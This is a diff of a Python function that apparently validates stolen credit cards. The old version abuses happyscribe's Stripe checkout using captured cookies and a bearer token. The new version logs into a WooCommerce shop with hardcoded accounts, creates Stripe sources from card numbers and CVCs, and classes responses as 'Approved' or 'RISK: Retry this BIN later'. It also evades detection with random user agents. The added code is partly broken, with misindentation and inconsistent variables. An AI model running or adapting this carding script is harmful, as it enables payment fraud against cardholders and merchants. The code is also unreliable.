@@ -338,92 +338,64 @@ def sq(card):
 	
 def stripe(ccx):
 	import requests
-	ccx=ccx.strip()
-	n = ccx.split("|")[0]
+		ccx = y.strip().split('\n')[0]
+	c = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
 	yy = ccx.split("|")[2]
 	cvc = ccx.split("|")[3]
-	if "20" in yy:#Mo3gza
+	if "20" in yy:
 		yy = yy.split("20")[1]
-	headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	acc = ['medjdjdj882ro@gmail.com','merospam00@gmail.com','mero00spam00@gmail.com','mero00spam00@gmail.com']
+	time.sleep(9)
+	email = random.choice(acc)
+	print(F+email)
+	user = user_agent.generate_user_agent()
+	r = requests.session()
+	headers = {'user-agent': user}
+	response = r.post(
+	    'https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
+	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
+	data = {
+    'username': email,
+    'password': 'A@Amir5520055',
+    'woocommerce-login-nonce': nonce,
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'login': 'Log in',
 }
 
-	data = f'type=card&billing_details[name]=yusuf&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf6d1134-90bb-47eb-b27c-cfc553d0d0275e6fb4&muid=ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5&sid=e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=26722&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZCW7j7pIUIasVSFAhqmDTpFl1MOc3hCNLeTdMbXXZDXJtc7EEBdupR-viL6YJAe666AFogrL2w_Z_jeeq_WrrWz9DU95GeMgduzRcqsJ4ZQ_B28EBX6EdZGAP8X-QMFabUEqf3A_92-8Kf3pwCOMCcJoGtNZ54AjbjiW0fDIgiuDys_FzfbpM98wbcHYau6mvUBA0e3siBypNANfVlpuJ2WNlRnqwSGCD_jMUgOXF1dlNBPsWZf8tfJxMZjnP2hxTIhMjtxK2AgFXjGnC9Uzsf-ukzOqWuAcW1wuwUpIbKKg-I2V1hdu9H7hKlMUqpiafuXwTIGo3uV26RB-0wgpxfxCDcNw_2gju90MNok3n9SGvdJsUvdnE4IPXXGpoHoOZsXYhHDKVv1UgrdpRRZ1-YtBqZU-4CXqFRJqc3WJY4QsyLc_z604Wj71bNdraah6JYUDpVWbQbhRrECyCXzNAuh39fOGePihu29ZddIEJ2mVS4ywX9mFP9AQIYruW-TpIH0Z_gBEOMNYNthQPpSuhwD70otqxo8Z8YWaGbr0oz-gUGfeXdvddhssZ_btpwWpoBPPdtzgKJDJ8ddYm8Hw6rPsDCgeKBE9z_UD4gEmBQAEyh5MXzszB6RZDTzXDVSjdRP8jmxdIETr6JWBs5Yj-swDfvd8k39oyPjPwb-u7qV8E5wUWErU-VlmqKNhxSsPioAMmq8JCqs5cYEro551dTO___JAbHEO4cDkBO0sV_JEtk_bk1GhlsHoHd9r-KaQgzvyO1bc8bMIAoS1u7DdaJbyko_tSC_1YdU_yapn0QioKl-oNt3Gp9c6eSOSHh-_xWYgKONQnxsvGh9JPsHLGPeUTV5ENIVB_K0ho8tVuYhaDJgp_55DKf2DjFFIkWWONxze9k7hpcgIbAAP9geqKmDe22mVW65V8zi6XcYKxqh14IGpPBof1Qw9bg63BmdHyURpUnuzhVeIy5hlj6AUCf1DrenRP5P7N3S8ZcDCELdNKLPWw0MbmaPxeTiME6__aPv7UhywP4VpyvanP3g8x2z9i9CWDoUbXi5opRf6amMq5QBxom3-bIOiZ5r9YgVyky4NJTGHUzRdX54YAOlCU1NE5Ja-oZQTd_ZwqdwhdOZIx6Ohs2eM-6dCwZDxxV6YZBs18FsPaXfQcPg4FKCpC83YlS8lUqaDjpeTzwzH1fahftakgDQTXxHd-62RWZ_SIcBZNDKOmrYp1-yGdFDRU_Mi70rQGFV0I94ffINMzgoVnUeufZ7mUI6XXnY8AUJhyiGJK2eRK0k3oeyDCm5CXy-4wqLJHYKRbGtTqaD9OMeYrBtRYymuUrMeKce-L845X_BJc4eG1ZIxMbx4bpdxhBrpplb3jSaEMywT3oyvRxbQ3El72cyPCR_qeqDP0qsBk98pyrQdF6g8D8_nxtRChhNzDF-X6VLCmXeYU9t9-bWcgz-KLPVOdRnHt_TG2Ks4gqPjqpFMkSl1zM0vtv9KJ-IEwjZdA11r75ZGsrV5Fnyr5nXyMzw5jAO8h8bSwYrCAfk4IKnhcFiy_gymuVFGW5QMrZWDeZ65KS6bzNH96KAapgTH9Mz4SzuffJ_mTR9jtj4xQkZkYXCsAdJNyywUDxU8Cs_kKgx99aD2zKEhKTJnuzR8B9igZRrHXPTSl5qzfx3A9uIRGq_1RSzrY0ryINfuIEYUAYO8D8gfD6nqW1JP9W9tWTl0CtdIolnbROW0jZGyXGdgAREP4HeNO5AlQVO_lqeJcVMEkIlUvIFDWJIfnJX0i04r_dkWmRrTD4Vsxzo9VJ2gcYNax47IzFy39pylB5tvn-RMqCZ1jOdxinqnihRRyx33sODLSExvjb75saIxJl73YAb_3C_8W8AFCYMIR7ifZQsyyedZJIJkBlb01ody9eS9uKPwUGVmDxKXzV0ErDzq290JOPuKrbYo0i2hBqw9OqkbuXkdcgMd3GJpUeEqLgGBiInTEafQwrvPSefCHhK-fXo_J7Hqx-bMYPjYimWEI_7zXJWA3dg_hw1O8gZel8vsy5JMgjeBFg7vb9svzaO9f9im4X6_FUgEczenMJyX_GsDJ4BH4KIS9t8uPwEBosa4vjAX257benu0lZAWO1EkS7IBImfgDptyB2JM4Co2V4cM5mVf7XqHNoYXJkX2lkzhQ8hB-ia3KnYTZhOWNjYaJwZAA.4L5u6H3jmOK658HDQbM2pr46esOmTm84BOlgILEozLE'
-
-	reso = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = r.post(
+	    'https://thefloordepot.com.au/my-account/add-payment-method/',
+	    cookies=r.cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
-	cookies = {
-    'ahoy_visitor': 'aa9059eb-6025-4c9c-8c93-06b2e7f66bf1',
-    'ahoy_visit': '80f8e7d9-33d9-4a44-a389-d3886d799439',
-    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D',
-    '_gcl_au': '1.1.191496317.1716898280',
-    '_gid': 'GA1.2.1548126584.1716898280',
-    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3',
-    'unsecure_is_signed_in': '1',
-    '_cioid': '11296645',
-    'intercom-device-id-frdatdus': '65896fd8-9074-419f-82af-44775a9800f5',
-    '__stripe_mid': 'ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5',
-    '__stripe_sid': 'e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d',
-    '_gat_UA-97995424-1': '1',
-    '_ga': 'GA1.1.1213546217.1716898279',
-    '_ga_4T8KCV9Y2D': 'GS1.1.1716911386.2.1.1716911702.60.0.0',
-    'intercom-session-frdatdus': 'WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d',
-    '_transcribe_session': 'GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7i9hGPm8d%2F%2BvqYGQ2QPMPZYvQ34snlJ8u%2FbZ%2FTJIQGhejj5W3p3Ow%3D%3D--fnFcV2OENluq4BD%2B--KIoAKM2gNf00FVX7WVRRMA%3D%3D',
-}
+	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
+	time.sleep(9)
+	headers = {'user-agent': user}
+	data = f'type=card&owner[name]=+&owner[email]={email}&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=fd6c82e4-dc3a-45f0-94f6-fd9a4e71ba50e29d22&muid=f3e26d94-2e55-4062-b4f0-19f14192506a71c920&sid=c11f9c06-17e1-4ae9-a386-e4af1a2eab4672a908&pasted_fields=number&payment_user_agent=stripe.js%2Fddbd33ac04%3B+stripe-js-v3%2Fddbd33ac04%3B+split-card-element&referrer=https%3A%2F%2Fthefloordepot.com.au&time_on_page=20013&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiN1dzWGtGNEE3WTBob0ExcUJJRDVFd0IrR0VabUQzaGJVcGxrK3o5NTRQZFNxaDNDU0ptaFFBelB0YWlSME5RMnIvWFFtdDloaG1GcWZ6S2ZkbU92bEpIaEVVaXgxVm03alUwUE9QOXBLaEJpYU1HbVhENDB0b1BlQm1QcFNUbzEzbm8xd1Q2MWFvUGNjd2ZXRmhXTUdqZmUvVDJvalJrS1VlQVhHMlk4YXJtQXhvYmo4NmUydld4RU9VUmJWQWRXSFQzaUo0QktwbEZ4eUVYaCtnQjUyZWdrOUV0by8rbXNiRWVXamxad2RzZGtkRUdKZVlQdGdwYmNuYkZhcU5DeWV1c2ptZG1EQ0xTL3JqS1k0VGVWdTNOQ0RPTjJWU0VFczkyME9PRFliU01aWjh3OGxZK25QSVBWRFpBU3N3bndIRVhEcEtUeE9mT0hWRW5JZzdOUCtNOXhUV1V0dHZYYWhvWEdxUFJBSlpiL2xYZlQ2blFIWUpnZEJrNmcrVVVtUEZ5Y3Q1d1lCZHd0dEljbjFPQ2hUOHpraklpVlJWaDd6SjBXUjJFOE12S09lNDIxTVZIRW4zQUUybjZJR2toTVYxZVJBK1VaSWRuaHNYamw4WTRWaHMyMXFBell6bE9iQ3k1cnE3R3VUWEIzUHo2SzZZYWswQnFFcjczdUdnb1o0U25JQVlyMlhTdGhkZjhWSWNYSzRLNnVRbGwrSGN4Y0xQZXM1NUZXYjJHZFdWU1RUSWRROEJYMXZyRnBiOVIxS3NYV0ZCRm1jcFM3VG1kRC9lZW9tL0tTT2R5aktyZHZiVWlPVlVwNmg1UEc2VWVsU2JBdGtaeEk2enR0aG5QZVBCM1BsSGZwRWhCNGxLQ0VQcDNDY1F6SUM3Qll1dE5HcTdLcGpSRm15S0RwNWFxWTZCUlhDKzJjYWNVNVpmWGVXdkZ6R1k5VmN5VEN2ZjBPb0pxZXBzUkFQZi83RnVqNWxCbkYwNW5OL2RFSllUVklHTDdDM0RlMmNHUkxrTjVHdGdwbnBMaVVwbkk2a0x4U0RCNlNiZnU4SXY4NnJlSTNiTDd3MVBDWmV3bXdhN2hheFNZalNQeWQ4YlYzdTVYQk82V0NORGZHbmV6NS9KMlVDRzdDbHdpREpDM3Q0Z0MxalI4ZVpxbTBTRGtweTkwdkZWNFlFaVRuQ1BpZnZmQUNybEcrWVBDb2doM0I2YnNOSksvTnRhZU9GQnBwOVhhdkEvbkRobWU1QUtvNFoxS0tEU1B0WVZTOWhhd0tQM21mL0NuSkJBQktENnBVUGwvWDdGQzJjWTFkYUMrMk5SdUxPZHYzQmNIc0pONzVnallWUFBOSzhkZ2JvS0hYMU15cWp0VityMlc1VnhyallUZWNoVHk5dzYwcldTc29QMjBBT0ZEK3NGenh0RHZtcFRvLzNqdjFzVGx2Rm5CbWVUcUNYNDBTcFVZQzdRcmZONlh6enk4MjdFSExBRzVTMGk5d2hLOGQ2U1RJaWMwanNEdE52NUVUcEVPa0hPS1lmMm02alVIcnMxSWlBcElSNHhlRHc4dUNzLzJ4TDNTYTcxYStiK1FVc040MWFyaHEvOTY1aDJKNGZualRoOXhuZld5ZUJXc3YzY0RLdnpBYU5GNXBtd2djTEJLcEpUYlhaWHE3M0xhVkxMR25JeEJ3bTBCQ1Z3d2JESjhIY1hxWXlwSDNiV2U3WVFhN3RES2xFOGxQdVFCL1p0UHhtVnlLSFhGQTRLK0o4MitUdzZzSnd2MjRXZDY2dWdrREJobGY0SUNHN0QyNkxiUmt5YWhYVTBaNlhQZlVyT0FDeXdBSTJ1bUMzT2F1L0huUXVFSXBxeVUxSGRyMFJwMGRBYkZ1ZFdzaTZIOTdoVVZ6NVRTS04vcitQUTVweU1KbVh4K3p2ZkVITTFxZzZLeUoxcVZyaUxFWDFZQnYwYmdxT0YrYlpkb1BnOGprMG5IYkYvYUVZK0VPL1ZVb00wcHdwN0o0QmdWSThteUZiQmFheFd1eHdZaXBwU2VVY3JScDlmK052dVVaOUtvLzNDNjh0dWd3THdKVUo1cTZjWmFqSGs3akNNV2Yzcm5JdzlpSEJ4bG02SUd6SDFiOVZMWExMOGFvM2VHVHY1VHFtKzFrQXkzZ3BxTmlyMDJGQXNUU2xoUTF1TWRUci9SQU8xeDhiQTFCbTFXdmFFZW0xOXQvTzRhaFRza1hXemJuUWJySGdsWW5ORDZUcS9PS3ZLQkxYY1V4TitwUmF6QXhXOXVwUGU5RnJwcW1VN040eGMzV3RLS1EvVDFycjBDZU5BcG1MRll3TnNxRDhXUVNkdGw3SEJpdVFUM0dJSUVVQzN1eEo5djhheW50OWJnQkVQNHV5MEJCK2xYWkhaWllhTnlXS1JLS3NHdFk2Q1grZnNMMzhOZktzVXhaa2pLSEw4RFpoSTZJR3ZFbzZ5eUNYcDRhTis0TmhPMHNyeXlteHBibGwxdEZ3aGxON1NwWWZuV216d1V0UHp5dlVoRFhRbTVFdWplb055TmVQZGMvdks1NEJqR2tOVFZKOE9kTThDbEJpdWRHVXptOGFYVHA5dFpLOWtVWHpoYm4wRGhkZHRWeHYyWTFqREZtak1EbFI5QXNlTzhBck9mbGVhTWRDMEt1WnAzYlIzNS92MlFLdVNSNFUxTXhvMDh6R04wdWNFZVpTMFBZalltU0dNaGsxNDlvdEswTEdKM2o3U1gwbFlGakFENVFjWm4yVUpvQTNLdUhwaWRvc3VyT29NeU9kdXBFMDN5c1pKZ25pUTZ5L1FrNitJUTVvaW9nMVJrPSIsImV4cCI6MTcyNDU4MDc4NCwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjI1NjNlN2I1IiwicGQiOjAsImNkYXRhIjoianVaOHFkUjFCTTRKbmxWYk1zZ3IrdDd1SFBPSjJSRWZTeDBUUnZwczVrUzJscWJFZXBJTTgxa1d2UndlWVp2QjNaNTQ1elk3c2lwa0hraXRkLzduRFBPOTFZRFY2MTZQU0s4c3k0L2YyWnRjZ0RvVzFnRmFDL05KcEp3QXNJbGU0TnBFUkg2cVBUVmppaEVUTytjY0xrYmJSN3N5d2d1Zjd1SlVIY1RySGhzUW1sMURTU2p6Z0JlQmw3cXNCa2w4aWMxWldrT3pEL2tFY0IxNCJ9.eYslvansSLiqSPUBQ80pqqiQXbk7QTS3nlOK8EDxQxA&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
+	response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
+	if not 'id' in response.json():
+	   print('ERORR CARD')
+	else:
+		id=response.json()['id']
 
-	headers = {
-    'authority': 'www.happyscribe.com',
-    'accept': 'application/json',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer OQRJtXO8dyPUQ3DMs8deCgtt',
-    'content-type': 'application/json',
-    # 'cookie': 'ahoy_visitor=aa9059eb-6025-4c9c-8c93-06b2e7f66bf1; ahoy_visit=80f8e7d9-33d9-4a44-a389-d3886d799439; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D; _gcl_au=1.1.191496317.1716898280; _gid=GA1.2.1548126584.1716898280; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3; unsecure_is_signed_in=1; _cioid=11296645; intercom-device-id-frdatdus=65896fd8-9074-419f-82af-44775a9800f5; __stripe_mid=ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5; __stripe_sid=e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d; _gat_UA-97995424-1=1; _ga=GA1.1.1213546217.1716898279; _ga_4T8KCV9Y2D=GS1.1.1716911386.2.1.1716911702.60.0.0; intercom-session-frdatdus=WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d; _transcribe_session=GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7i9hGPm8d%2F%2BvqYGQ2QPMPZYvQ34snlJ8u%2FbZ%2FTJIQGhejj5W3p3Ow%3D%3D--fnFcV2OENluq4BD%2B--KIoAKM2gNf00FVX7WVRRMA%3D%3D',
-    'origin': 'https://www.happyscribe.com',
-    'referer': 'https://www.happyscribe.com/v2/10807386/checkout?new_subscription_interval=month&plan=pro_2023_05_01&step=billing_details',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	headers = {'user-agent': user}
+	
+	params = {
+    'wc-ajax': 'wc_stripe_create_setup_intent',
 }
-
-	json_data = {
-    'id': 10486458,
-    'address': '9350 N Central Expy',
-    'name': 'yusuf',
-    'country': 'US',
-    'vat': None,
-    'billing_account_id': 10486458,
-    'last4': '9305',
-    'orderReference': 'nljannd',
-    'user_id': 11296645,
-    'organization_id': 10807386,
-    'hours': 0,
-    'balance_increase_in_cents': None,
-    'payment_method_id': ide,
-    'transcription_id': None,
-    'plan': 'pro_2023_05_01',
-    'order_id': None,
-    'recurrence_interval': 'month',
-    'extra_plan_hours': None,
+	data = {
+    'stripe_source_id': id,
+    'nonce': nonce,
 }
-
-	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
+	
+	r3 = r.post(
+	    'https://thefloordepot.com.au/',
+	    params=params,
+	    headers=headers,
+	    data=data,
+	)
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
@@ -437,15 +409,15 @@ def stripe(ccx):
 	match = re.search(pattern, text)
 	if match:
 		result = match.group(1)
-		if 'risk_threshold' in text:
+		if 'risk_threshold' in r3:
 			result = "RISK: Retry this BIN later."
 	else:
-		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+		if 'Nice! New payment method added' in r3 or 'Payment method successfully added.' in r3:
 			result = "1000: Approved"
 		else:
 			result = "Error"
 	
-	if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
+		if 'avs' in result or 'suceded' in result or 'success' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result or 'succeeded' in result:
 			return 'Approved'
 	else:
 		return result
